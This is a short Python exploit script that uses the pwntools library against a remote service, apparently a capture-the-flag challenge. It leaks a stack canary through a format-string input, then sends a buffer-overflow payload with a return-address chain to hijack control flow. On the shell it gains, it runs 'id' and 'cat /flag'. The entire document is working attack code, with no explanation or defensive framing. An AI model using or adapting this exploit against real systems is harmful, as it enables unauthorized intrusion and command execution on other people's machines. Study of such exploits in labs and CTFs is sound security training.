#!/usr/bin/env python3
import sys, time, re
from pwn import remote, context, p64
context.log_level = 'error'
MAIN = 0x4012bc
RET  = 0x40101a
BACK = 0x401262

def run(host, port, chain, tag):
    io = remote(host, port)
    io.send(b'%11$p'.ljust(32, b'\x00'))
    time.sleep(0.3)
    data = io.recvrepeat(0.8)
    m = re.search(rb'0x[0-9a-f]{6,16}', data)
    val = int(m.group(0), 16)
    payload = b'A'*40 + p64(val) + b'B'*8 + b''.join(p64(x) for x in chain)
    io.send(payload)
    time.sleep(0.4)
    d = io.recvrepeat(1.2)
    print('[%s] stage2: %r' % (tag, d[:240]))
    io.send(b'echo PWNED; id; cat /flag\n')
    time.sleep(0.4)
    d2 = io.recvrepeat(1.5)
    print('[%s] shell : %r' % (tag, d2[:400]))
    io.close()

host, port = sys.argv[1], int(sys.argv[2])
run(host, port, [RET, BACK], 'aligned')
run(host, port, [BACK], 'direct')
